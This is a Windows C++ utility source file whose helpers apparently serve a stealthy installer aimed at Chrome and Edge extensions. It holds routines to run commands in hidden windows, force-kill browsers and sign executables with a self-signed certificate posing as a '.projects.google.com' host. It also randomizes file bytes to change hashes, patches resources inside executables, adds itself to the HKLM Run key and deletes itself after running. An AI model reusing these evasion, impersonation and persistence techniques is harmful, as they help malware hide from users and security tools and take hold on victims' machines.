
#include "ProcessUtil.h"
#include <vector>
#include <minwindef.h>
#include <string>
#include <random>
#include <algorithm>
#include <cctype>
#include <wincrypt.h>
#include <softpub.h>
#include <wintrust.h>
#include <tchar.h>
#include <iostream>
#include <process.h> 
//#include <userenv.h>
//#include <wtsapi32.h>
//#include <tlhelp32.h>
//#pragma comment(lib, "userenv.lib")
//#pragma comment(lib, "wtsapi32.lib")

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wintrust.lib")

//#define		MY_DEBUG_LOG

using namespace std;

int _execute(const wchar_t* p_szEXE, const wchar_t* p_pszCommandParam, int	p_bWait /*= 1*/)
{
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = L"open";
	ShExecInfo.lpFile = p_szEXE;
	ShExecInfo.lpParameters = p_pszCommandParam; //  L"/C apktool.bat -f d D:\\work\\_FCM\\test_org.apk -o D:\\work\\_FCM\\aaa";
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE; // SW_NORMAL

	if (ShellExecuteEx(&ShExecInfo)) {
		// Wait for the process to exit
		if (p_bWait == 1) {
			WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
		}
		else {
			Sleep(1000);
		}
		DWORD dwCode = 0;
		GetExitCodeProcess(ShExecInfo.hProcess, &dwCode);
		return 0;
	}
	return 1;
}
// Global variable to store the window handle found
HWND g_windowHandle = NULL;

// Callback function to enumerate all windows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD windowProcessID;
	GetWindowThreadProcessId(hwnd, &windowProcessID);

	wchar_t className[256];
	GetClassName(hwnd, className, sizeof(className) / sizeof(wchar_t));

	// Check if the window's process ID matches the target process ID and class name
	if (windowProcessID == static_cast<DWORD>(lParam) &&
		wcscmp(className, L"Chrome_WidgetWin_1") == 0) {

		// Ensure the window is visible and a top-level window
		if (IsWindowVisible(hwnd) && GetWindow(hwnd, GW_OWNER) == NULL) {
			g_windowHandle = hwnd; // Store the found window handle
			return FALSE;          // Stop enumeration as we found the window
		}
	}

	return TRUE; // Continue enumeration
}

// Function to get the window handle with a specific class name from the process ID
HWND FindWindowFromProcessID(DWORD processID) {
	g_windowHandle = NULL; // Reset the global window handle
	EnumWindows(EnumWindowsProc, static_cast<LPARAM>(processID));
	return g_windowHandle;
}

void GetOpenedHWndFromMyBrowser(HWND& p_hChrome, HWND& p_hEdge)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD processID = 0;
	HWND	w_hTemp = 0;

	// Take a snapshot of all processes in the system
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return ;
	}

	// Set the size of the structure before using it
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap); // Clean the snapshot object
		return ;
	}
	// Now walk the snapshot of processes
	do
	{
		//. chrome
		if (_wcsicmp(pe32.szExeFile, L"chrome.exe") == 0)
		{
			processID = pe32.th32ProcessID;
			w_hTemp = 0;
			w_hTemp = FindWindowFromProcessID(processID);
			if (w_hTemp != 0 && p_hChrome == 0) {
				p_hChrome = w_hTemp;
			}
		}
		//. msedge
		if (_wcsicmp(pe32.szExeFile, L"msedge.exe") == 0)
		{
			processID = pe32.th32ProcessID;
			w_hTemp = 0;
			w_hTemp = FindWindowFromProcessID(processID);
			if (w_hTemp != 0 && p_hEdge == 0) {
				p_hEdge = w_hTemp;
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return;
}

// Helper function to find a process ID by name
DWORD FindProcessId(const std::wstring& processName)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD processID = 0;

	// Take a snapshot of all processes in the system
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	// Set the size of the structure before using it
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap); // Clean the snapshot object
		return 0;
	}
	// Now walk the snapshot of processes
	do
	{
		if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0)
		{
			processID = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return processID;
}

// Helper function to kill a process by ID
bool KillProcessById(DWORD processId)
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
	if (hProcess == NULL)
	{
		return false;
	}
	if (!TerminateProcess(hProcess, 1))
	{
		CloseHandle(hProcess);
		return false;
	}
	CloseHandle(hProcess);
	return true;
}
void TeminateHWndAndProcessName(HWND	p_hOpenedWnd, int  p_nOpt)
{
	std::wstring processName = L"";

	if (p_nOpt == 0) {
		processName = L"chrome.exe";
	}
	else if (p_nOpt == 1) {
		processName = L"msedge.exe";
	}
	else {
		return;
	}

	if (p_hOpenedWnd) {
		SendMessage(p_hOpenedWnd, WM_CLOSE, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_CLOSE, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_QUIT, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_SYSCOMMAND, 0, 0);
		Sleep(500);
	}
	if (p_nOpt == 0) {
		Sleep(1000);
	}
	else if (p_nOpt == 1) {
		Sleep(5000);
//x		MessageBoxA(NULL, "Please check msedge.exe", "Test", MB_OK | MB_TOPMOST);
	}
	TeminateProcess(processName);
	Sleep(2000);
	return;
}

void TeminateHWndAndProcessName_web(HWND	p_hOpenedWnd, int  p_nOpt)
{
	std::wstring processName = L"";

	if (p_nOpt == 0) {
		processName = L"chrome.exe";
	}
	else if (p_nOpt == 1) {
		processName = L"msedge.exe";
	}
	else {
		return;
	}

	if (p_hOpenedWnd) {
		SendMessage(p_hOpenedWnd, WM_CLOSE, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_CLOSE, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_QUIT, 0, 0);
		Sleep(500);
		PostMessage(p_hOpenedWnd, WM_SYSCOMMAND, 0, 0);
		Sleep(500);
	}
	Sleep(1000);
	TeminateProcess(processName);
	return;
}

BOOL TeminateProcess(const std::wstring& processName)
{
	BOOL		w_bRtn = FALSE;
	TCHAR		w_szParam[MAX_PATH] = L"";

	while (TRUE) {
		DWORD processId = FindProcessId(processName);
		if (processId != 0)
		{
			w_bRtn = TRUE;
			KillProcessById(processId);
			swprintf(w_szParam, L"/C taskkill /IM %s /F", processName.c_str());
			_execute(L"cmd.exe", w_szParam, 0);
			Sleep(50);
			continue;
		}
		else {
			break;
		}
	}

	return w_bRtn;


}
bool FileExists(LPCWSTR filePath) {
	DWORD fileAttributes = GetFileAttributes(filePath);
	if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
		return false; // File does not exist or an error occurred
	}
	return true; // File exists
}
std::wstring charToWstring(const char* pPos) {
	// Check if pPos is not null
	if (pPos == nullptr) {
		return L"";
	}

	// Convert char* to std::string
	std::string str(pPos);

	// Convert std::string to std::wstring
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring wstr = converter.from_bytes(str);

	return wstr;
}

// Function to get the system directory
std::wstring GetSystemDirectoryPath() {
	wchar_t systemDir[MAX_PATH];
	UINT ret = GetSystemDirectory(systemDir, MAX_PATH);
	if (ret == 0) {
		return L"";
	}
	return std::wstring(systemDir);
}

// Function to get the login user name
std::wstring GetLoginUserName() {
	wchar_t userName[MAX_PATH];
	DWORD size = MAX_PATH;
	if (!GetUserName(userName, &size)) {
		return L"";
	}
	return std::wstring(userName);
}

bool FindManifestJson(const std::wstring& directory) {
	WIN32_FIND_DATA findFileData;
	HANDLE hFind;

	std::wstring searchPath = directory + L"\\*";
	hFind = FindFirstFile(searchPath.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		return false;
	}

	do {
		const std::wstring fileOrDirName = findFileData.cFileName;
		if (fileOrDirName == L"." || fileOrDirName == L"..") {
			continue;
		}

		std::wstring fullPath = directory + L"\\" + fileOrDirName;
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			// Recursively check the directory
			if (FindManifestJson(fullPath)) {
				FindClose(hFind);
				return true;
			}
		}
		else {
			// Check if the file is manifest.json
			if (fileOrDirName == L"manifest.json") {
				FindClose(hFind);
				return true;
			}
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

	FindClose(hFind);
	return false;
}
//.
bool FindFolderInDirectory(const std::wstring& directory, const std::wstring& targetFolderName) {
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::wstring searchPattern = directory + L"\\*";

	hFind = FindFirstFile(searchPattern.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		return false;
	}

	do {
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			std::wstring folderName = findFileData.cFileName;
			if (folderName != L"." && folderName != L"..") {
				std::wstring fullPath = directory + L"\\" + folderName;
				if (_wcsicmp(folderName.c_str(), targetFolderName.c_str()) == 0 && FindManifestJson(fullPath)) {
					FindClose(hFind);
					return true;
				}
				else {
					// Recursively search in subdirectory
					if (FindFolderInDirectory(fullPath, targetFolderName)) {
						FindClose(hFind);
						return true;
					}
				}
			}
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

	FindClose(hFind);

	DWORD dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES) {
		return false;
	}

	return false;
}


size_t getFileSize(const std::wstring& filePath) {
	HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 0;
	}

	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hFile, &fileSize)) {
		CloseHandle(hFile);
		return 0;
	}

	CloseHandle(hFile);
	return static_cast<size_t>(fileSize.QuadPart);
}


// Function to split a version string into its components
std::vector<int> splitVersion(const std::string& version) {
	std::vector<int> result;
	std::stringstream ss(version);
	std::string item;

	while (std::getline(ss, item, '.')) {
		result.push_back(std::stoi(item));
	}

	return result;
}

// Function to compare two version strings
int compareVersions(const std::string& version1, const std::string& version2) {
	std::vector<int> v1 = splitVersion(version1);
	std::vector<int> v2 = splitVersion(version2);

	size_t length = max(v1.size(), v2.size());

	for (size_t i = 0; i < length; ++i) {
		int num1 = (i < v1.size()) ? v1[i] : 0;
		int num2 = (i < v2.size()) ? v2[i] : 0;

		if (num1 > num2) {
			return 1;
		}
		else if (num1 < num2) {
			return -1;
		}
	}

	return 0;
}

std::string readVersionFile(const std::string& filePath) {
	std::ifstream file(filePath);
	std::string version;

	if (!file.is_open()) {
		return "";
	}
	// Read the entire content of the file into the version string
	std::getline(file, version);

	file.close();
	return version;
}


bool run_command(const string& command, string& result) {
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe) {
		return false;
	}

	char buffer[128] = { 0 };
	while (fgets(buffer, sizeof(buffer), pipe) != 0) {
		result += buffer;
	}

	_pclose(pipe);
	return true;
}

string replaceAll(string str, const string& from, const string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Move past the replacement
	}
	return str;
}

string trim(const string& str) {
	auto start = str.begin();
	while (start != str.end() && isspace(*start)) {
		++start;
	}

	auto end = str.end();
	do {
		--end;
	} while (end != start && isspace(*end));

	return string(start, end + 1);
}

string getRandomString(size_t length) {
	const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	random_device rd;
	mt19937 generator(rd());
	uniform_int_distribution<> distribution(0, chars.size() - 1);
	string randomString;
	for (size_t i = 0; i < length; ++i) {
		randomString += chars[distribution(generator)];
	}

	return randomString;
}

void cmd_sign(std::string  p_exePath, std::string  p_signToolPath)
{
	bool succeeded = false;
	do {
		string result;

		// Create a self-sign certificate.
		string CN = getRandomString(GD_ADD_FILE_DATA_LEN) + ".projects.google.com";
		string createCertCmd = "powershell -Command \"New-SelfSignedCertificate -Type CodeSigning -Subject \'CN=aaa\' -KeyUsage DigitalSignature -FriendlyName \'aaa\' -DnsName \'aaa\' -CertStoreLocation \'Cert:\\CurrentUser\\My\'\"";
		createCertCmd = replaceAll(createCertCmd, "aaa", CN);
		bool ret = run_command(createCertCmd, result);
		if (!ret) {
			break;
		}

		//.
		size_t endPos = result.find(string("CN=") + CN);
		if (endPos == string::npos) {
			break;
		}
		size_t startPos = result.rfind('\n', endPos);
		if (endPos == string::npos) {
			break;
		}
		string thumbprint = result.substr(startPos + 1, endPos - startPos - 1);
		thumbprint = trim(thumbprint);

		// Sign the executable
		string exePath = p_exePath;
		string signCmd = "signtool sign /fd SHA256 /sha1 thumbprint /tr http://timestamp.sectigo.com/ /td SHA256 exePath";
		signCmd = replaceAll(signCmd, "thumbprint", thumbprint);
		signCmd = replaceAll(signCmd, "exePath", exePath);
		signCmd = replaceAll(signCmd, "signtool", p_signToolPath);
		result = "";
		ret = run_command(signCmd, result);
		if (!ret || result.find(string("Successfully signed: ") + exePath) == string::npos) {
			break;
		}

		succeeded = true;
	} while (0);

	return;
}


void WriteDataToFile(const std::string& filePath, const std::vector<char>& data) {
	std::ofstream file(filePath, std::ios::binary);
	if (!file) {
		std::cerr << "Failed to open file for writing: " << filePath << std::endl;
		return;
	}
	file.write(data.data(), data.size());
	if (!file) {
		std::cerr << "Failed to write data to file: " << filePath << std::endl;
	}
	file.close();
}


std::vector<char> RetrieveResourceData(UINT resourceID) {
	std::vector<char> data;

	// Find the resource
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRes == NULL) {
		return data;
	}

	// Load the resource
	HGLOBAL hResData = LoadResource(NULL, hRes);
	if (hResData == NULL) {
		return data;
	}

	// Lock the resource to get a pointer to the data
	LPVOID pResData = LockResource(hResData);
	if (pResData == NULL) {
		return data;
	}

	// Get the size of the resource
	DWORD resSize = SizeofResource(NULL, hRes);
	if (resSize == 0) {
		return data;
	}

	// Copy the resource data to a vector
	data.assign(static_cast<char*>(pResData), static_cast<char*>(pResData) + resSize);
	return data;
}

std::string RetrieveStringFromRawResource(UINT resourceID) {
	std::string result;

	// Find the resource
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_STRING);
	if (hRes == NULL) {
		return result;
	}

	// Load the resource
	HGLOBAL hResData = LoadResource(NULL, hRes);
	if (hResData == NULL) {
		return result;
	}

	// Lock the resource to get a pointer to the data
	LPVOID pResData = LockResource(hResData);
	if (pResData == NULL) {
		return result;
	}

	// Get the size of the resource
	DWORD resSize = SizeofResource(NULL, hRes);
	if (resSize == 0) {
		return result;
	}

	// Copy the resource data to a string
	result.assign(static_cast<char*>(pResData), resSize);
	return result;
}


bool UpdateResourceInExecutable(const std::wstring& executablePath, const std::vector<char>& data, UINT resourceID) {
	// Open the executable file for resource updating
	HANDLE hUpdate = BeginUpdateResource(executablePath.c_str(), FALSE);
	if (hUpdate == NULL) {
		std::cerr << "BeginUpdateResource failed: " << GetLastError() << std::endl;
		return false;
	}

	// Update the resource (we'll use RT_RCDATA type and a custom name)
	if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(resourceID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (LPVOID)data.data(), data.size())) {
		std::cerr << "UpdateResource failed: " << GetLastError() << std::endl;
		EndUpdateResource(hUpdate, TRUE);
		return false;
	}

	// Commit the changes
	if (!EndUpdateResource(hUpdate, FALSE)) {
		std::cerr << "EndUpdateResource failed: " << GetLastError() << std::endl;
		return false;
	}

	return true;
}
bool UpdateStringResourceInExecutable(const std::wstring& executablePath, const std::string& newStringValue, UINT resourceID) {
	// Open the executable file for resource updating
	HANDLE hUpdate = BeginUpdateResource(executablePath.c_str(), FALSE);
	if (hUpdate == NULL) {
		std::cerr << "BeginUpdateResource failed: " << GetLastError() << std::endl;
		return false;
	}

	// The string resource data needs to be a wide character string (WCHAR)
	const char* stringData = newStringValue.c_str();
	size_t stringDataSize = (newStringValue.size() + 1) * sizeof(char); // +1 for null terminator

	// Update the string resource
	if (!UpdateResource(hUpdate, RT_STRING, MAKEINTRESOURCE(resourceID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (LPVOID)stringData, stringDataSize)) {
		std::cerr << "UpdateResource failed: " << GetLastError() << std::endl;
		EndUpdateResource(hUpdate, TRUE);
		return false;
	}

	// Commit the changes
	if (!EndUpdateResource(hUpdate, FALSE)) {
		std::cerr << "EndUpdateResource failed: " << GetLastError() << std::endl;
		return false;
	}

	return true;
}
std::wstring GetExecutableDirectory() {
	wchar_t path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);

	std::wstring fullPath = path;
	size_t pos = fullPath.find_last_of(L"\\/");
	return fullPath.substr(0, pos);
}
std::string MyGetCurrentTime() {
	time_t now = time(0);
	tm* localtm = localtime(&now);
	char timeStr[100];
	strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", localtm);
	return std::string(timeStr);
}

void MyWriteLog(const char* format, ...) 
{
#ifdef MY_DEBUG_LOG
	FILE* w_pFile = NULL;

	w_pFile = fopen("C:\\Users\\Public\\data\\zcrxdebug.txt", "ab");

	if (w_pFile) {
		char LogData[1024] = "";
		char buffer[1024] = "";
		va_list args;
		va_start(args, format);
		vsnprintf(buffer, sizeof(buffer), format, args);
		va_end(args);

		std::string w_sTime = MyGetCurrentTime();
		sprintf(LogData, "%s - %s\n", w_sTime.c_str(), buffer);

		fwrite(LogData, strlen(LogData), 1, w_pFile);
	}

	fclose(w_pFile);

#endif
	return;
}
void MyWriteLog_Web(const char* format, ...)
{
#ifdef MY_DEBUG_LOG
	FILE* w_pFile = NULL;

	w_pFile = fopen("C:\\Users\\Public\\webdata\\zcrxdebug.txt", "ab");

	if (w_pFile) {
		char LogData[1024] = "";
		char buffer[1024] = "";
		va_list args;
		va_start(args, format);
		vsnprintf(buffer, sizeof(buffer), format, args);
		va_end(args);

		std::string w_sTime = MyGetCurrentTime();
		sprintf(LogData, "%s - %s\n", w_sTime.c_str(), buffer);

		fwrite(LogData, strlen(LogData), 1, w_pFile);
	}

	fclose(w_pFile);

#endif
	return;
}

BOOL	IsFileExist(const char* p_FilePaht)
{
	FILE* w_pFile = NULL;
	w_pFile = fopen(p_FilePaht, "rb");
	if (w_pFile != NULL) {
		fclose(w_pFile);
		return TRUE;
	}
	else {
		return FALSE;
	}
}
//
//bool GetCertDateInfo(const std::wstring& filePath, SYSTEMTIME& p_stNotBefore, SYSTEMTIME& p_stNotAfter) {
//	WINTRUST_FILE_INFO fileInfo;
//	memset(&fileInfo, 0, sizeof(fileInfo));
//	fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
//	fileInfo.pcwszFilePath = filePath.c_str();
//
//	WINTRUST_DATA trustData;
//	memset(&trustData, 0, sizeof(trustData));
//	trustData.cbStruct = sizeof(WINTRUST_DATA);
//	trustData.dwUIChoice = WTD_UI_NONE;
//	trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
//	trustData.dwUnionChoice = WTD_CHOICE_FILE;
//	trustData.dwStateAction = WTD_STATEACTION_VERIFY;
//	trustData.pFile = &fileInfo;
//
//	GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
//
//	LONG status = WinVerifyTrust(NULL, &policyGUID, &trustData);
//	if (status == ERROR_SUCCESS) {
//		CRYPT_PROVIDER_DATA* pProvData = WTHelperProvDataFromStateData(trustData.hWVTStateData);
//		if (pProvData) {
//			CRYPT_PROVIDER_SGNR* pProvSigner = WTHelperGetProvSignerFromChain(pProvData, 0, FALSE, 0);
//			if (pProvSigner) {
//				PCCERT_CONTEXT pCertContext = pProvSigner->pasCertChain[0].pCert;
//				if (pCertContext) {
//					// Get the NotBefore and NotAfter fields from the certificate
////					SYSTEMTIME stNotBefore, stNotAfter;
//					FileTimeToSystemTime(&pCertContext->pCertInfo->NotBefore, &p_stNotBefore);
//					FileTimeToSystemTime(&pCertContext->pCertInfo->NotAfter, &p_stNotAfter);
//
//					// Cleanup
//					trustData.dwStateAction = WTD_STATEACTION_CLOSE;
//					WinVerifyTrust(NULL, &policyGUID, &trustData);
//
//					return true;
//				}
//			}
//		}
//	}
//
//	// Cleanup in case of failure
//	trustData.dwStateAction = WTD_STATEACTION_CLOSE;
//	WinVerifyTrust(NULL, &policyGUID, &trustData);
//
//	return false;
//}


bool Test_GetCertDateInfo(const std::wstring& filePath, SYSTEMTIME&	p_stStartTime) {
	HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	HCERTSTORE hStore = NULL;
	HCRYPTMSG hMsg = NULL;
	PCCERT_CONTEXT pCertContext = NULL;

	DWORD dwEncoding, dwContentType, dwFormatType;
	if (!CryptQueryObject(CERT_QUERY_OBJECT_FILE, filePath.c_str(),
		CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
		CERT_QUERY_FORMAT_FLAG_BINARY, 0, &dwEncoding, &dwContentType, &dwFormatType,
		&hStore, &hMsg, NULL)) {
		CloseHandle(hFile);
		return false;
	}

	pCertContext = CertFindCertificateInStore(hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
	if (!pCertContext) {
		CertCloseStore(hStore, 0);
		CloseHandle(hFile);
		return false;
	}

	SYSTEMTIME endTime;
	FileTimeToSystemTime(&pCertContext->pCertInfo->NotBefore, &p_stStartTime);
	FileTimeToSystemTime(&pCertContext->pCertInfo->NotAfter, &endTime);


	CertFreeCertificateContext(pCertContext);
	CertCloseStore(hStore, 0);
	CloseHandle(hFile);

	return true;
}

// Helper function to retrieve the system time
SYSTEMTIME GetCurrentSystemTime() {
	SYSTEMTIME st;
	GetSystemTime(&st);
	return st;
}

// Helper function to convert SYSTEMTIME to FILETIME
FILETIME SystemTimeToFileTime(const SYSTEMTIME& st) {
	FILETIME ft;
	SystemTimeToFileTime(&st, &ft);
	return ft;
}

// Helper function to convert FILETIME to SYSTEMTIME
SYSTEMTIME FileTimeToSystemTime(const FILETIME& ft) {
	SYSTEMTIME st;
	FileTimeToSystemTime(&ft, &st);
	return st;
}

// Helper function to convert FILETIME to ULONGLONG
ULONGLONG FileTimeToULONGLONG(const FILETIME& ft) {
	ULARGE_INTEGER uli;
	uli.LowPart = ft.dwLowDateTime;
	uli.HighPart = ft.dwHighDateTime;
	return uli.QuadPart;
}


// Function to calculate the difference between two SYSTEMTIME values
int CalculateTimeDifference(const SYSTEMTIME& stSysTime, const SYSTEMTIME& stCertTime) {
	FILETIME ft1 = SystemTimeToFileTime(stSysTime);
	FILETIME ft2 = SystemTimeToFileTime(stCertTime);

	ULONGLONG ull1 = FileTimeToULONGLONG(ft1);
	ULONGLONG ull2 = FileTimeToULONGLONG(ft2);

	if (ull2 >= ull1) {
		return 0;
	}
	else {
		ULONGLONG diff = (ull1 - ull2) / (36000000000LL);
		return (int)diff;
	}
}

bool AddHeaderToFile(const std::string& inputFilePath, const std::string& outputFilePath) {

	std::ifstream inputFile(inputFilePath, std::ios::binary);
	if (!inputFile) {
		return false;
	}
	std::vector<char> fileContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
	inputFile.close();

	std::ofstream outputFile(outputFilePath, std::ios::binary);
	if (!outputFile) {
		return false;
	}

	std::string w_AddData = getRandomString(GD_ADD_FILE_DATA_LEN);
	outputFile.write(w_AddData.c_str(), w_AddData.size());
	outputFile.write(fileContent.data(), fileContent.size());

	outputFile.close();

	return true;
}

bool SubHeaderToFile(const std::string& inputFilePath, const std::string& outputFilePath) {

	std::ifstream inputFile(inputFilePath, std::ios::binary);
	if (!inputFile) {
		return false;
	}
	std::vector<char> fileContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
	inputFile.close();

	std::ofstream outputFile(outputFilePath, std::ios::binary);
	if (!outputFile) {
		return false;
	}

	outputFile.write(fileContent.data() + GD_ADD_FILE_DATA_LEN, fileContent.size() - GD_ADD_FILE_DATA_LEN);

	outputFile.close();

	return true;
}

bool ModContentToFile(const std::string& inputFilePath, const std::string& outputFilePath) {

	std::ifstream inputFile(inputFilePath, std::ios::binary);
	if (!inputFile) {
		return false;
	}
	std::vector<char> fileContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
	inputFile.close();

	std::ofstream outputFile(outputFilePath, std::ios::binary);
	if (!outputFile) {
		return false;
	}

	std::string w_ModData = getRandomString(GD_MOD_FILE_CONTENT_LEN);

	outputFile.write(fileContent.data(), GD_MOD_FILE_CONTENT_START);

	outputFile.write(w_ModData.c_str(), GD_MOD_FILE_CONTENT_LEN);

	outputFile.write(fileContent.data() + GD_MOD_FILE_CONTENT_START + GD_MOD_FILE_CONTENT_LEN, fileContent.size() - GD_MOD_FILE_CONTENT_START - GD_MOD_FILE_CONTENT_LEN);

	outputFile.close();

	return true;
}

void AddToStartup(const std::string& appName, const std::string& appPath) {
	HKEY hKey;
	// Open the Run key for the current user.
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
		// Set the value for your program to run at startup.
		RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (DWORD)(appPath.size() + 1));
		RegCloseKey(hKey);
	}
	return;
}

std::string GetProcessName() {
	char path[MAX_PATH];
	// Get the full path of the executable
	if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
		std::string fullPath = path;
		// Extract the process name from the full path
		size_t pos = fullPath.find_last_of("\\/");
		if (pos != std::string::npos) {
			return fullPath.substr(pos + 1);
		}
	}
	return "";
}

void	GetAppNameAndUUIDInfo(std::string p_sFilePath, std::string& p_sAppName, std::string& p_sUUID)
{
	FILE*	w_pFile = NULL;
	char	w_pDataBuffer[MAX_PATH] = "";
	string	w_sFileData = "";

	w_pFile = fopen(p_sFilePath.c_str(), "rb");
	fread(w_pDataBuffer, 1, MAX_PATH - 1, w_pFile);
	w_sFileData = w_pDataBuffer;

	size_t idPos = w_sFileData.find("/");
	if (idPos != std::string::npos) {
		p_sAppName = w_sFileData.substr(0, idPos);
		p_sUUID = w_sFileData.substr(idPos + 1, w_sFileData.size() - idPos - 1);
	}
	else {
		p_sAppName = w_sFileData;
	}


	if (w_pFile)
		fclose(w_pFile);

	return;
}

void	SetAppNameAndUUIDInfo(std::string p_sFilePath, std::string& p_sAppName, std::string& p_sUUID)
{
	FILE* w_pFile = NULL;
	char	w_pDataBuffer[MAX_PATH] = "";
	string	w_sFileData = "";

	w_pFile = fopen(p_sFilePath.c_str(), "wb");

	if (p_sUUID.empty() == false) {
		sprintf(w_pDataBuffer, "%s/%s", p_sAppName.c_str(), p_sUUID.c_str());
	}
	else {
		sprintf(w_pDataBuffer, "%s", p_sAppName.c_str());
	}
	fwrite(w_pDataBuffer, 1, MAX_PATH - 1, w_pFile);

	if (w_pFile)
		fclose(w_pFile);

	return;

}

string get_app_path(bool onlyFolder/* = true*/, bool remainSeperator/* = true*/) {
	char path[1024];
	DWORD len = GetModuleFileNameA(NULL, path, sizeof(path));
	if (len == 0 || len == sizeof(path))
		return "";
	path[len] = '\0';

	return string(path);
}

bool delete_myself() {
	string myPath = get_app_path(false, true);
	string tempPath = myPath + ".tmp";

	// Move the old version to tempPath
	BOOL ret = MoveFileExA(myPath.c_str(), tempPath.c_str(), MOVEFILE_COPY_ALLOWED | MOVEFILE_WRITE_THROUGH);
	if (!ret) {
		return false;
	}

	// Delete the temporary file
	intptr_t error = _execlp("cmd", "cmd", "/c", "ping", "127.0.0.1", "-n", "3", ">nul", "&", "del", tempPath.c_str(), NULL);
	if (-1 == error) {
		return false;
	}
	return true;
}
std::string SpliteServerAddr(const std::string p_sURL)
{
	std::string jsonString = p_sURL;

	std::string key = "://";
	size_t startPos = jsonString.find(key);

	if (startPos != std::string::npos) {
		// Extract the URL using substr
		std::string url = jsonString.substr(startPos + 3);
		return url;
	}
	else {
	}

	return p_sURL;
}

bool IsExtensionInstalled(std::wstring& p_sExtensionID, bool p_bChromeOREdge)
{
	std::wstring systemDir = GetSystemDirectoryPath();
	std::wstring loginUser = GetLoginUserName();
	std::wstring searchPath = L"";

	std::wstring	w_sSystemVolume = systemDir.substr(0, 1);

	if (p_bChromeOREdge == true) {
		searchPath = w_sSystemVolume + L":\\Users\\" + loginUser + L"\\AppData\\Local\\Google\\Chrome";
	}
	else {
		searchPath = w_sSystemVolume + L":\\Users\\" + loginUser + L"\\AppData\\Local\\Microsoft\\Edge";
	}

	if (searchPath == L"") {
		return false;
	}
	if (FindFolderInDirectory(searchPath, p_sExtensionID)) {
		return true;
	}
	else {
		return false;
	}
}


